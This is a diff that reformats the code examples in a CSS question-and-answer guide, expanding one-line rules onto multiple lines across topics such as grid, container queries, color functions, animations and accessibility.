@@ -2064,9 +2338,15 @@ Only a few properties work on it, like `color`, `content` and font properties.
 It applies image effects to an element and everything inside it.
 
 ```css
-img.gray { filter: grayscale(100%); }
-.blurred { filter: blur(4px); }
-.icon:hover { filter: brightness(1.2) drop-shadow(0 2px 4px rgb(0 0 0 / 30%)); }
+img.gray {
+  filter: grayscale(100%);
+}
+.blurred {
+  filter: blur(4px);
+}
+.icon:hover {
+  filter: brightness(1.2) drop-shadow(0 2px 4px rgb(0 0 0 / 30%));
+}
 ```
 
 Other functions: `contrast()`, `saturate()`, `sepia()`, `invert()`, `hue-rotate()` and `opacity()`. Any filter other than `none` creates a stacking context.
@@ -2097,8 +2377,14 @@ For long URLs or ids in user content, `overflow-wrap: anywhere` is usually the r
 It makes the browser spread text evenly across lines, so a heading doesn't end with one lonely word on the last line.
 
 ```css
-h1, h2, h3 { text-wrap: balance; }
-p { text-wrap: pretty; }
+h1,
+h2,
+h3 {
+  text-wrap: balance;
+}
+p {
+  text-wrap: pretty;
+}
 ```
 
 `balance` only works on short blocks (a few lines), because it's costly. `pretty` mainly avoids a single word on the last line of a paragraph. Browsers that don't support these values just ignore them.
@@ -2127,7 +2413,9 @@ Better options are viewport units (`min-height: 100dvh`), flexbox or grid with s
 It makes the element's own box disappear, and its children act as if they were children of its parent. It's useful when a wrapper element gets in the way of a flex or grid layout.
 
 ```css
-.wrapper { display: contents; }
+.wrapper {
+  display: contents;
+}
 ```
 
 Old browser versions had bugs where `display: contents` removed the element's meaning for screen readers, for example on buttons and lists. Most of these are fixed, but don't use it on interactive elements.
@@ -2148,8 +2436,8 @@ It ignores that declaration or rule and carries on. That's what makes fallbacks 
 
 ```css
 .box {
-  height: 100vh;   /* old browsers use this */
-  height: 100dvh;  /* new browsers override it */
+  height: 100vh; /* old browsers use this */
+  height: 100dvh; /* new browsers override it */
 }
 ```
 
@@ -2171,8 +2459,10 @@ For features that aren't Baseline yet, use `@supports` or make sure the page sti
 - `:where()` always has zero specificity, whatever is inside it.
 
 ```css
-:is(#main, .content) p { }   /* (1,0,1): the #main counts even when .content matched */
-:where(#main, .content) p { } /* (0,0,1) */
+:is(#main, .content) p {
+} /* (1,0,1): the #main counts even when .content matched */
+:where(#main, .content) p {
+} /* (0,0,1) */
 ```
 
 The first case surprises people. Having one id in the list makes the whole `:is()` as strong as an id, even for elements that only matched the class.
@@ -2182,14 +2472,21 @@ The first case surprises people. Having one id in the list makes the whole `:is(
 Use `:where()` when you want styles that are easy to override, like resets, base styles and library defaults. Any single class can beat them.
 
 ```css
-:where(ul, ol)[role="list"] { list-style: none; padding: 0; }
-:where(.btn) { padding: 0.5rem 1rem; }
+:where(ul, ol)[role="list"] {
+  list-style: none;
+  padding: 0;
+}
+:where(.btn) {
+  padding: 0.5rem 1rem;
+}
 ```
 
 Use `:is()` when you just want shorter selectors and normal specificity:
 
 ```css
-:is(h1, h2, h3):hover { color: navy; }
+:is(h1, h2, h3):hover {
+  color: navy;
+}
 ```
 
 ### 153: What is `:has()` and what can you do with it?
@@ -2198,16 +2495,24 @@ Use `:is()` when you just want shorter selectors and normal specificity:
 
 ```css
 /* card that contains an image */
-.card:has(img) { grid-template-rows: 200px 1fr; }
+.card:has(img) {
+  grid-template-rows: 200px 1fr;
+}
 
 /* label before an invalid input */
-label:has(+ input:user-invalid) { color: crimson; }
+label:has(+ input:user-invalid) {
+  color: crimson;
+}
 
 /* form with a checked checkbox */
-form:has(input[name="agree"]:checked) button { opacity: 1; }
+form:has(input[name="agree"]:checked) button {
+  opacity: 1;
+}
 
 /* lock page scroll while a modal is open */
-html:has(dialog[open]) { overflow: hidden; }
+html:has(dialog[open]) {
+  overflow: hidden;
+}
 ```
 
 It's Baseline since late 2023. A lot of things that used to need JavaScript to toggle classes can now be done with it.
@@ -2220,10 +2525,18 @@ You can write rules inside other rules, like in Sass.
 .card {
   padding: 1rem;
 
-  & h2 { font-size: 1.25rem; }
-  .meta { color: gray; }          /* & is optional before a class */
-  &:hover { box-shadow: 0 4px 12px rgb(0 0 0 / 10%); }
-  &.featured { border-color: gold; }
+  & h2 {
+    font-size: 1.25rem;
+  }
+  .meta {
+    color: gray;
+  } /* & is optional before a class */
+  &:hover {
+    box-shadow: 0 4px 12px rgb(0 0 0 / 10%);
+  }
+  &.featured {
+    border-color: gold;
+  }
 
   @media (width >= 768px) {
     padding: 2rem;
@@ -2249,13 +2562,19 @@ Cascade layers let you group styles into named layers and decide which layers wi
 @layer reset, base, components, utilities;
 
 @layer reset {
-  * { margin: 0; }
+  * {
+    margin: 0;
+  }
 }
 @layer components {
-  #sidebar .nav a { color: gray; } /* high specificity */
+  #sidebar .nav a {
+    color: gray;
+  } /* high specificity */
 }
 @layer utilities {
-  .text-red { color: red; }        /* still wins, because the layer is later */
+  .text-red {
+    color: red;
+  } /* still wins, because the layer is later */
 }
 ```
 
@@ -2340,7 +2659,9 @@ A BFC is an area where block boxes are laid out on their own, separate from the 
 The cleanest way is `display: flow-root`. It exists only for this purpose and has no side effects. Other things that create a BFC: `overflow` other than `visible` or `clip`, `float`, `position: absolute` or `fixed`, `display: inline-block`, flex and grid items, table cells, `contain: layout` and multi-column containers.
 
 ```css
-.media { display: flow-root; } /* contains floated image, no clearfix */
+.media {
+  display: flow-root;
+} /* contains floated image, no clearfix */
 ```
 
 ### 165: What is the containing block of an absolutely positioned element?
@@ -2380,9 +2701,15 @@ Fix: move the modal to be a direct child of `body`, remove the property from the
 
 ```css
 /* container 600px, items with basis 100px each = 300px free */
-.a { flex: 1 1 100px; } /* gets 100 + 100 = 200px */
-.b { flex: 2 1 100px; } /* gets 100 + 200 = 300px */
-.c { flex: 0 1 100px; } /* stays 100px */
+.a {
+  flex: 1 1 100px;
+} /* gets 100 + 100 = 200px */
+.b {
+  flex: 2 1 100px;
+} /* gets 100 + 200 = 300px */
+.c {
+  flex: 0 1 100px;
+} /* stays 100px */
 ```
 
 **Shrinking:** the overflow is shared in proportion to `flex-shrink × flex-basis`. That way bigger items shrink more in pixels. No item shrinks below its minimum size (see `min-width: auto`).
@@ -2412,8 +2739,13 @@ In grid, `align-content` moves the whole grid inside the container when the trac
 Auto margins take all the free space on their side, before `justify-content` runs. It's a simple way to push one item away from the others.
 
 ```css
-.nav { display: flex; gap: 1rem; }
-.nav .logout { margin-left: auto; } /* pushed to the far right */
+.nav {
+  display: flex;
+  gap: 1rem;
+}
+.nav .logout {
+  margin-left: auto;
+} /* pushed to the far right */
 ```
 
 `margin: auto` on a single child centers it both ways.
@@ -2433,8 +2765,14 @@ body {
 Flexbox version:
 
 ```css
-body { min-height: 100svh; display: flex; flex-direction: column; }
-main { flex: 1; }
+body {
+  min-height: 100svh;
+  display: flex;
+  flex-direction: column;
+}
+main {
+  flex: 1;
+}
 ```
 
 ### 174: How do you build the "holy grail" layout?
@@ -2463,11 +2801,21 @@ A header, a footer, and three columns (left sidebar, main, right sidebar) that t
   }
 }
 
-header { grid-area: header; }
-main   { grid-area: main; }
-.left  { grid-area: left; }
-.right { grid-area: right; }
-footer { grid-area: footer; }
+header {
+  grid-area: header;
+}
+main {
+  grid-area: main;
+}
+.left {
+  grid-area: left;
+}
+.right {
+  grid-area: right;
+}
+footer {
+  grid-area: footer;
+}
 ```
 
 ### 175: What is the difference between `auto-fill` and `auto-fit`?
@@ -2523,8 +2871,12 @@ You can name lines in the track list and place items by name.
     [content-start] minmax(0, 60rem) [content-end]
     1fr [full-end];
 }
-.page > * { grid-column: content; }
-.page > .full-bleed { grid-column: full; }
+.page > * {
+  grid-column: content;
+}
+.page > .full-bleed {
+  grid-column: full;
+}
 ```
 
 Lines named `x-start` and `x-end` create an implicit area called `x`. That's why `grid-column: content` works.
@@ -2573,8 +2925,13 @@ Put them in the same cell. You don't need absolute positioning, and the containe
 .hero > * {
   grid-area: 1 / 1;
 }
-.hero img { z-index: 0; }
-.hero .text { z-index: 1; align-self: end; }
+.hero img {
+  z-index: 0;
+}
+.hero .text {
+  z-index: 1;
+  align-self: end;
+}
 ```
 
 ### 183: What are container queries?
@@ -2613,8 +2970,12 @@ They are like viewport units, but relative to the nearest size container:
 - `cqmin` / `cqmax`: the smaller / larger one.
 
 ```css
-.card-wrapper { container-type: inline-size; }
-.card h2 { font-size: clamp(1rem, 5cqi, 2rem); }
+.card-wrapper {
+  container-type: inline-size;
+}
+.card h2 {
+  font-size: clamp(1rem, 5cqi, 2rem);
+}
 ```
 
 If there's no container, they fall back to the small viewport units.
@@ -2629,7 +2990,9 @@ If there's no container, they fall back to the small viewport units.
 }
 
 @container sidebar (width < 300px) {
-  .widget { font-size: 0.875rem; }
+  .widget {
+    font-size: 0.875rem;
+  }
 }
 ```
 
@@ -2640,11 +3003,17 @@ Without a name, `@container` queries the nearest ancestor container of any name.
 They check the computed value of a custom property on the container, not its size.
 
 ```css
-.card { --variant: default; }
-.card.featured { --variant: featured; }
+.card {
+  --variant: default;
+}
+.card.featured {
+  --variant: featured;
+}
 
 @container style(--variant: featured) {
-  .card-title { color: gold; }
+  .card-title {
+    color: gold;
+  }
 }
 ```
 
@@ -2656,10 +3025,12 @@ It lets you write comparisons instead of `min-` and `max-`.
 
 ```css
 /* old */
-@media (min-width: 600px) and (max-width: 899.98px) { }
+@media (min-width: 600px) and (max-width: 899.98px) {
+}
 
 /* new */
-@media (600px <= width < 900px) { }
+@media (600px <= width < 900px) {
+}
 ```
 
 It's clearer and avoids the `899.98px` trick that prevented overlap at the boundary. It's Baseline since 2023 and also works in `@container`.
@@ -2709,10 +3080,14 @@ They describe the user's input device:
 
 ```css
 @media (hover: hover) {
-  .card:hover { transform: translateY(-4px); }
+  .card:hover {
+    transform: translateY(-4px);
+  }
 }
 @media (pointer: coarse) {
-  .button { min-height: 44px; }
+  .button {
+    min-height: 44px;
+  }
 }
 ```
 
@@ -2723,9 +3098,16 @@ This stops "sticky hover" on phones, where a tapped element stays in its hover s
 When `dir="rtl"` is set, `inline-start` becomes the right side. If you write `margin-inline-start` instead of `margin-left`, the layout flips with no extra CSS.
 
 ```css
-.icon { margin-inline-end: 0.5rem; }
-.quote { border-inline-start: 4px solid; padding-inline-start: 1rem; }
-.menu { inset-inline-end: 0; }
+.icon {
+  margin-inline-end: 0.5rem;
+}
+.quote {
+  border-inline-start: 4px solid;
+  padding-inline-start: 1rem;
+}
+.menu {
+  inset-inline-end: 0;
+}
 ```
 
 Flexbox and grid already follow text direction. Mostly, you need to update spacing, borders, positioning and `text-align`.
@@ -2735,7 +3117,9 @@ Flexbox and grid already follow text direction. Mostly, you need to update spaci
 `:dir(rtl)` and `:dir(ltr)` match elements based on their text direction, including direction inherited from parents. `[dir="rtl"]` only matches the element that has the attribute.
 
 ```css
-.arrow:dir(rtl) { transform: scaleX(-1); }
+.arrow:dir(rtl) {
+  transform: scaleX(-1);
+}
 ```
 
 It's Baseline since 2023.
@@ -2746,9 +3130,11 @@ It sets whether lines of text run horizontally or vertically, and which way bloc
 
 ```css
 .vertical-label {
-  writing-mode: vertical-rl;  /* top to bottom, lines go right to left */
+  writing-mode: vertical-rl; /* top to bottom, lines go right to left */
 }
-.sideways { writing-mode: sideways-lr; } /* newer, rotates the text */
+.sideways {
+  writing-mode: sideways-lr;
+} /* newer, rotates the text */
 ```
 
 It's used for Chinese and Japanese text, and for vertical labels on tables or charts. Logical properties follow `writing-mode`, so `inline-size` becomes the height in vertical mode.
@@ -2758,21 +3144,27 @@ It's used for Chinese and Japanese text, and for vertical labels on tables or ch
 Custom properties are normal properties that inherit by default. You can set one on `:root` for global use, or on any element to override it for that part of the page.
 
 ```css
-:root { --gap: 1rem; }
-.compact { --gap: 0.5rem; }
-.stack > * + * { margin-top: var(--gap); }
+:root {
+  --gap: 1rem;
+}
+.compact {
+  --gap: 0.5rem;
+}
+.stack > * + * {
+  margin-top: var(--gap);
+}
 ```
 
 Everything inside `.compact` gets the smaller gap. This makes them good for component variants and themes.
 
 ### 197: What is the difference between custom properties and Sass variables?
 
-| Sass variables | Custom properties |
-|---|---|
-| Replaced at build time and gone from the output | Live in the browser |
-| Can't change with media queries or JS | Can change in media queries, on hover, or from JS |
-| No cascade or inheritance | Follow the cascade and inherit |
-| Work in selectors and media query conditions | Only work in property values |
+| Sass variables                                  | Custom properties                                 |
+| ----------------------------------------------- | ------------------------------------------------- |
+| Replaced at build time and gone from the output | Live in the browser                               |
+| Can't change with media queries or JS           | Can change in media queries, on hover, or from JS |
+| No cascade or inheritance                       | Follow the cascade and inherit                    |
+| Work in selectors and media query conditions    | Only work in property values                      |
 
 Many teams use both: Sass for build-time values like breakpoints, and custom properties for theme values that change at runtime.
 
@@ -2824,7 +3216,9 @@ Gradients can't be animated directly. You can animate a registered custom proper
 }
 
 @keyframes rotate {
-  to { --angle: 360deg; }
+  to {
+    --angle: 360deg;
+  }
 }
 ```
 
@@ -2833,10 +3227,14 @@ Gradients can't be animated directly. You can animate a registered custom proper
 When a `var()` gives a value that doesn't work for the property, the browser has already thrown away other declarations for that property during the cascade. So it can't fall back to an earlier rule. Instead, the property becomes `unset`: it inherits if it's an inherited property, otherwise it uses its initial value.
 
 ```css
-:root { --size: red; }
+:root {
+  --size: red;
+}
 p {
   font-size: 20px;
-  font-size: var(--size); /* invalid, so font-size becomes unset (inherited), not 20px */
+  font-size: var(
+    --size
+  ); /* invalid, so font-size becomes unset (inherited), not 20px */
 }
 ```
 
@@ -2881,7 +3279,9 @@ body {
 }
 
 /* force one theme for part of the page */
-.always-dark { color-scheme: dark; }
+.always-dark {
+  color-scheme: dark;
+}
 ```
 
 `light-dark()` is Baseline since 2024. It only works with colors (newer specs extend it to images). It follows the `color-scheme` of the element, so you can let users switch themes by changing `color-scheme` instead of copying all your variables.
@@ -2910,11 +3310,19 @@ It's an easy way to make hover states, tints and see-through versions from one b
 It lets you take an existing color and change its channels.
 
 ```css
-:root { --brand: #4f46e5; }
+:root {
+  --brand: #4f46e5;
+}
 
-.light  { background: oklch(from var(--brand) calc(l + 0.2) c h); }
-.faded  { background: rgb(from var(--brand) r g b / 50%); }
-.shift  { background: hsl(from var(--brand) calc(h + 30) s l); }
+.light {
+  background: oklch(from var(--brand) calc(l + 0.2) c h);
+}
+.faded {
+  background: rgb(from var(--brand) r g b / 50%);
+}
+.shift {
+  background: hsl(from var(--brand) calc(h + 30) s l);
+}
 ```
 
 The `from` keyword breaks the color into channels (`l`, `c`, `h` or `r`, `g`, `b`), and you can use `calc()` on each one. It's in all major browsers since 2024.
@@ -2934,7 +3342,9 @@ Modern screens can show colors outside sRGB (Display P3). You can use them with 
   background: #ff3366;
 }
 @media (color-gamut: p3) {
-  .cta { background: color(display-p3 1 0.15 0.4); }
+  .cta {
+    background: color(display-p3 1 0.15 0.4);
+  }
 }
 ```
 
@@ -2980,20 +3390,30 @@ The traditional way is a grid trick, which works everywhere:
   grid-template-rows: 0fr;
   transition: grid-template-rows 300ms;
 }
-.panel.open { grid-template-rows: 1fr; }
-.panel > .inner { overflow: hidden; }
+.panel.open {
+  grid-template-rows: 1fr;
+}
+.panel > .inner {
+  overflow: hidden;
+}
 ```
 
 The newer way is `interpolate-size: allow-keywords`, which lets the browser animate between a length and `auto`. Right now it only works in Chromium browsers. Others just jump with no animation, which is a fine fallback.
 
 ```css
-:root { interpolate-size: allow-keywords; }
+:root {
+  interpolate-size: allow-keywords;
+}
 details::details-content {
   height: 0;
   overflow: clip;
-  transition: height 300ms, content-visibility 300ms allow-discrete;
+  transition:
+    height 300ms,
+    content-visibility 300ms allow-discrete;
 }
-details[open]::details-content { height: auto; }
+details[open]::details-content {
+  height: auto;
+}
 ```
 
 ### 210: What does `animation-fill-mode` do?
@@ -3010,16 +3430,26 @@ It decides what styles apply before the animation starts and after it ends.
   opacity: 0;
   animation: fade 500ms 200ms forwards;
 }
-@keyframes fade { to { opacity: 1; } }
+@keyframes fade {
+  to {
+    opacity: 1;
+  }
+}
 ```
 
 ### 211: How do you pause or reverse an animation with CSS?
 
 ```css
-.spinner { animation: spin 1s linear infinite; }
-.spinner:hover { animation-play-state: paused; }
+.spinner {
+  animation: spin 1s linear infinite;
+}
+.spinner:hover {
+  animation-play-state: paused;
+}
 
-.pulse { animation: pulse 1s ease-in-out infinite alternate; }
+.pulse {
+  animation: pulse 1s ease-in-out infinite alternate;
+}
 ```
 
 `animation-direction: alternate` plays forward, then backward. `reverse` always plays backward. To restart an animation from JavaScript, remove the animation, force a reflow, and set it again. Or use the Web Animations API, which has `play()`, `pause()` and `reverse()`.
@@ -3029,9 +3459,15 @@ It decides what styles apply before the animation starts and after it ends.
 They are timing functions.
 
 ```css
-.a { transition-timing-function: cubic-bezier(0.34, 1.56, 0.64, 1); } /* overshoot */
-.b { animation-timing-function: steps(8); }  /* sprite sheet, 8 frames */
-.c { transition-timing-function: linear(0, 0.6 20%, 1.1 50%, 0.95 70%, 1); } /* bounce-ish */
+.a {
+  transition-timing-function: cubic-bezier(0.34, 1.56, 0.64, 1);
+} /* overshoot */
+.b {
+  animation-timing-function: steps(8);
+} /* sprite sheet, 8 frames */
+.c {
+  transition-timing-function: linear(0, 0.6 20%, 1.1 50%, 0.95 70%, 1);
+} /* bounce-ish */
 ```
 
 - `cubic-bezier()` sets a curve with two control points. Values above 1 overshoot.
@@ -3046,9 +3482,13 @@ Animating `width`, `height`, `top`, `left`, `margin` or `padding` triggers layou
 
 ```css
 /* bad */
-.panel { transition: left 300ms; }
+.panel {
+  transition: left 300ms;
+}
 /* good */
-.panel { transition: transform 300ms; }
+.panel {
+  transition: transform 300ms;
+}
 ```
 
 ### 214: What are the individual transform properties?
@@ -3059,10 +3499,16 @@ Animating `width`, `height`, `top`, `left`, `margin` or `padding` triggers layou
 .card {
   translate: 0 0;
   scale: 1;
-  transition: translate 200ms, scale 200ms;
+  transition:
+    translate 200ms,
+    scale 200ms;
 }
-.card:hover { translate: 0 -4px; }
-.card:active { scale: 0.98; } /* hover translate stays */
+.card:hover {
+  translate: 0 -4px;
+}
+.card:active {
+  scale: 0.98;
+} /* hover translate stays */
 ```
 
 They are applied in a fixed order: `translate`, then `rotate`, then `scale`, then the `transform` property.
@@ -3072,8 +3518,12 @@ They are applied in a fixed order: `translate`, then `rotate`, then `scale`, the
 Each function changes the coordinate system for the ones after it.
 
 ```css
-.a { transform: translateX(100px) rotate(45deg); } /* moves right, then rotates in place */
-.b { transform: rotate(45deg) translateX(100px); } /* rotates, then moves along the rotated axis (diagonally) */
+.a {
+  transform: translateX(100px) rotate(45deg);
+} /* moves right, then rotates in place */
+.b {
+  transform: rotate(45deg) translateX(100px);
+} /* rotates, then moves along the rotated axis (diagonally) */
 ```
 
 `transform-origin` sets the point that rotate and scale use. The default is the center: `transform-origin: top left;` rotates around the corner.
@@ -3083,17 +3533,23 @@ Each function changes the coordinate system for the ones after it.
 You need `perspective` for depth, either on the parent or as a function.
 
 ```css
-.scene { perspective: 800px; }
+.scene {
+  perspective: 800px;
+}
 .card {
   transform-style: preserve-3d;
   transition: transform 600ms;
 }
-.scene:hover .card { transform: rotateY(180deg); }
+.scene:hover .card {
+  transform: rotateY(180deg);
+}
 .card .back {
   transform: rotateY(180deg);
   backface-visibility: hidden;
 }
-.card .front { backface-visibility: hidden; }
+.card .front {
+  backface-visibility: hidden;
+}
 ```
 
 A smaller `perspective` value gives a stronger 3D effect. `preserve-3d` lets children keep their 3D position instead of being flattened.
@@ -3103,7 +3559,9 @@ A smaller `perspective` value gives a stronger 3D effect. `preserve-3d` lets chi
 `will-change` tells the browser that a property is going to change, so it can prepare, usually by giving the element its own compositor layer.
 
 ```css
-.drawer { will-change: transform; }
+.drawer {
+  will-change: transform;
+}
 ```
 
 Use it only on a few elements that you know will animate, and ideally add it just before the animation and remove it after. Putting it on many elements uses a lot of GPU memory and can make things slower. It also creates a stacking context and a containing block for fixed children.
@@ -3131,8 +3589,12 @@ Use it only on a few elements that you know will animate, and ideally add it jus
 It controls what happens when you reach the end of a scroll area. By default, scrolling "chains" to the parent, so scrolling past the end of a modal starts scrolling the page behind it.
 
 ```css
-.modal-body { overscroll-behavior: contain; } /* no chaining */
-body { overscroll-behavior-y: none; }         /* also no pull-to-refresh or bounce */
+.modal-body {
+  overscroll-behavior: contain;
+} /* no chaining */
+body {
+  overscroll-behavior-y: none;
+} /* also no pull-to-refresh or bounce */
 ```
 
 ### 220: How do you stop a fixed header from covering anchor targets?
@@ -3140,10 +3602,14 @@ body { overscroll-behavior-y: none; }         /* also no pull-to-refresh or boun
 Use `scroll-margin-top` on the targets or `scroll-padding-top` on the scroll container.
 
 ```css
-html { scroll-padding-top: 80px; } /* height of the sticky header */
+html {
+  scroll-padding-top: 80px;
+} /* height of the sticky header */
 
 /* or per element */
-h2[id] { scroll-margin-top: 80px; }
+h2[id] {
+  scroll-margin-top: 80px;
+}
 ```
 
 These offsets also work for focus scrolling and `scrollIntoView()`.
@@ -3154,9 +3620,9 @@ The standard properties:
 
 ```css
 .panel {
-  scrollbar-width: thin;              /* auto, thin, none */
-  scrollbar-color: #888 transparent;  /* thumb track */
-  scrollbar-gutter: stable;           /* reserve space so layout doesn't jump */
+  scrollbar-width: thin; /* auto, thin, none */
+  scrollbar-color: #888 transparent; /* thumb track */
+  scrollbar-gutter: stable; /* reserve space so layout doesn't jump */
 }
 ```
 
@@ -3212,7 +3678,9 @@ Use a "visually hidden" class:
   outline: 3px solid #4f46e5;
   outline-offset: 2px;
 }
-:focus:not(:focus-visible) { outline: none; } /* rarely needed now */
+:focus:not(:focus-visible) {
+  outline: none;
+} /* rarely needed now */
 ```
 
 Rules of thumb:
@@ -3231,7 +3699,9 @@ It's an accessibility mode (like Windows High Contrast) where the OS replaces yo
   .button {
     border: 1px solid ButtonText; /* make sure the button has an edge */
   }
-  .icon { forced-color-adjust: auto; }
+  .icon {
+    forced-color-adjust: auto;
+  }
 }
 ```
 
@@ -3244,12 +3714,16 @@ There are two approaches:
 ```css
 /* opt-out: animate by default, tone down when asked */
 @media (prefers-reduced-motion: reduce) {
-  .hero { animation: none; }
+  .hero {
+    animation: none;
+  }
 }
 
 /* opt-in: only animate when the user hasn't asked for less motion */
 @media (prefers-reduced-motion: no-preference) {
-  .hero { animation: slide-in 600ms ease-out; }
+  .hero {
+    animation: slide-in 600ms ease-out;
+  }
 }
 ```
 
@@ -3261,10 +3735,10 @@ Yes, most screen readers read generated `content`. So don't put important inform
 
 ```css
 .new::before {
-  content: "★" / "New";       /* read as "New" */
+  content: "★" / "New"; /* read as "New" */
 }
 .decoration::after {
-  content: "→" / "";          /* not read at all */
+  content: "→" / ""; /* not read at all */
 }
 ```
 
@@ -3275,11 +3749,16 @@ Generated content can't be selected or copied, and it disappears if CSS fails to
 BEM (Block, Element, Modifier) is a class naming convention:
 
 ```css
-.card { }                 /* block */
-.card__title { }          /* element: part of the block */
-.card__button { }
-.card--featured { }       /* modifier: a variant */
-.card__button--disabled { }
+.card {
+} /* block */
+.card__title {
+} /* element: part of the block */
+.card__button {
+}
+.card--featured {
+} /* modifier: a variant */
+.card__button--disabled {
+}
 ```
 
 Everything is a single class, so specificity stays flat and low. Class names show where the styles live and what they belong to, which helps on big teams. The downsides are long class names, and nested elements can get awkward.
@@ -3306,15 +3785,21 @@ CSS Modules is a build-time feature where every class name in a `.module.css` fi
 
 ```css
 /* Button.module.css */
-.button { padding: 0.5rem 1rem; }
-.primary { background: royalblue; }
+.button {
+  padding: 0.5rem 1rem;
+}
+.primary {
+  background: royalblue;
+}
 ```
 
 ```jsx
 import styles from "./Button.module.css";
 
 export function Button({ children }) {
-  return <button className={`${styles.button} ${styles.primary}`}>{children}</button>;
+  return (
+    <button className={`${styles.button} ${styles.primary}`}>{children}</button>
+  );
 }
 ```
 
@@ -3344,15 +3829,26 @@ This is why web components are usually themed with CSS variables.
 
 ```css
 /* inside the component's shadow root */
-:host { display: block; border: 1px solid; }
-:host([variant="primary"]) { border-color: blue; }
-:host(:hover) { background: #f5f5f5; }
-::slotted(p) { margin: 0; }   /* only top-level slotted elements */
+:host {
+  display: block;
+  border: 1px solid;
+}
+:host([variant="primary"]) {
+  border-color: blue;
+}
+:host(:hover) {
+  background: #f5f5f5;
+}
+::slotted(p) {
+  margin: 0;
+} /* only top-level slotted elements */
 ```
 
 ```css
 /* outside, in page CSS */
-my-card::part(title) { font-size: 1.5rem; }
+my-card::part(title) {
+  font-size: 1.5rem;
+}
 ```
 
 ```html
@@ -3368,13 +3864,19 @@ my-card::part(title) { font-size: 1.5rem; }
 
 ```css
 @scope (.card) {
-  img { border-radius: 8px; }
-  :scope { padding: 1rem; } /* the .card itself */
+  img {
+    border-radius: 8px;
+  }
+  :scope {
+    padding: 1rem;
+  } /* the .card itself */
 }
 
 /* "donut" scope: stop at .content */
 @scope (.tabs) to (.tab-content) {
-  a { color: inherit; }
+  a {
+    color: inherit;
+  }
 }
 ```
 
@@ -3389,22 +3891,31 @@ It also adds **scoping proximity** to the cascade: when two scoped rules have th
 $breakpoint-md: 768px;
 
 @mixin respond($bp) {
-  @media (min-width: $bp) { @content; }
+  @media (min-width: $bp) {
+    @content;
+  }
 }
 
 .card {
   padding: t.$space-4;
   width: math.div(100%, 3);
 
-  &__title { font-size: 1.25rem; }  // .card__title (string joining)
+  &__title {
+    font-size: 1.25rem;
+  } // .card__title (string joining)
 
   @include respond($breakpoint-md) {
     padding: t.$space-6;
   }
 }
 
-%visually-hidden { position: absolute; clip-path: inset(50%); }
-.sr-only { @extend %visually-hidden; }
+%visually-hidden {
+  position: absolute;
+  clip-path: inset(50%);
+}
+.sr-only {
+  @extend %visually-hidden;
+}
 ```
 
 Variables, mixins, partials with `@use`, BEM string joining with `&__`, functions and loops are the main reasons people still use Sass.
@@ -3416,9 +3927,9 @@ Variables, mixins, partials with `@use`, BEM string joining with `&__`, function
 `@use` loads a file once, gives it a namespace, and keeps private members (names that start with `-` or `_`) private.
 
 ```scss
-@use "colors";            // colors.$primary
-@use "spacing" as s;      // s.$md
-@forward "buttons";       // re-export from an index file
+@use "colors"; // colors.$primary
+@use "spacing" as s; // s.$md
+@forward "buttons"; // re-export from an index file
 ```
 
 Sass ships a migrator tool (`sass-migrator module`) for moving old code over.
@@ -3439,18 +3950,28 @@ Lightning CSS is written in Rust and does most of this in one fast tool. Vite ca
 `@supports` applies styles only if the browser supports a property and value, or a selector.
 
 ```css
-.layout { display: flex; flex-wrap: wrap; }
+.layout {
+  display: flex;
+  flex-wrap: wrap;
+}
 
 @supports (display: grid) {
-  .layout { display: grid; grid-template-columns: repeat(3, 1fr); }
+  .layout {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+  }
 }
 
 @supports not (backdrop-filter: blur(1px)) {
-  .glass { background: rgb(255 255 255 / 90%); }
+  .glass {
+    background: rgb(255 255 255 / 90%);
+  }
 }
 
 @supports selector(:has(a)) {
-  .card:has(img) { padding: 0; }
+  .card:has(img) {
+    padding: 0;
+  }
 }
 ```
 
@@ -3460,12 +3981,17 @@ You write a baseline that works everywhere, then add features for browsers that 
 
 ```css
 .card {
-  background: #4f46e5;                                  /* everyone */
-  background: oklch(55% 0.2 270);                       /* modern browsers */
+  background: #4f46e5; /* everyone */
+  background: oklch(55% 0.2 270); /* modern browsers */
 }
-.cards { display: flex; flex-wrap: wrap; }
+.cards {
+  display: flex;
+  flex-wrap: wrap;
+}
 @supports (grid-template-rows: subgrid) {
-  .cards { display: grid; /* ... */ }
+  .cards {
+    display: grid; /* ... */
+  }
 }
 ```
 
@@ -3506,8 +4032,14 @@ A variable font is one font file that contains a whole range of styles along "ax
   font-weight: 100 900;
 }
 
-h1 { font-weight: 750; }   /* any value in the range */
-.custom { font-variation-settings: "wght" 650, "opsz" 32; }
+h1 {
+  font-weight: 750;
+} /* any value in the range */
+.custom {
+  font-variation-settings:
+    "wght" 650,
+    "opsz" 32;
+}
 ```
 
 You get fewer files, smooth animation between weights, and in-between values like 550.
@@ -3526,7 +4058,9 @@ Make the fallback font take up the same space as the web font, using `@font-face
   line-gap-override: 0%;
 }
 
-body { font-family: "Inter", "Inter Fallback", sans-serif; }
+body {
+  font-family: "Inter", "Inter Fallback", sans-serif;
+}
 ```
 
 Next.js (`next/font`), Fontaine and Capsize can work out these values for you. `font-size-adjust` is another option. It scales fallback fonts so their x-height matches.
@@ -3536,10 +4070,18 @@ Next.js (`next/font`), Fontaine and Capsize can work out these values for you. `
 Use `clip-path`. Only the part inside the shape is shown, and clicks only register inside it.
 
 ```css
-.avatar  { clip-path: circle(50%); }
-.slanted { clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%); }
-.inset   { clip-path: inset(10px round 12px); }
-.custom  { clip-path: path("M0,0 L100,0 L100,80 Q50,100 0,80 Z"); }
+.avatar {
+  clip-path: circle(50%);
+}
+.slanted {
+  clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
+}
+.inset {
+  clip-path: inset(10px round 12px);
+}
+.custom {
+  clip-path: path("M0,0 L100,0 L100,80 Q50,100 0,80 Z");
+}
 ```
 
 `clip-path` can be animated between shapes that have the same number of points. Newer browsers also support `shape()`, which works like `path()` but accepts CSS units and percentages, so it can be responsive.
@@ -3582,7 +4124,9 @@ It only works on floats. You can also pass an image, and its alpha channel sets 
 `box-shadow` follows the element's box, including its `border-radius`. `drop-shadow()` follows the real visible shape, including transparent PNG and SVG edges and `clip-path` shapes. It doesn't support `spread` or `inset`.
 
 ```css
-.logo { filter: drop-shadow(0 2px 4px rgb(0 0 0 / 30%)); } /* follows the logo outline */
+.logo {
+  filter: drop-shadow(0 2px 4px rgb(0 0 0 / 30%));
+} /* follows the logo outline */
 ```
 
 ### 249: What do blend modes do?
@@ -3590,7 +4134,10 @@ It only works on floats. You can also pass an image, and its alpha channel sets 
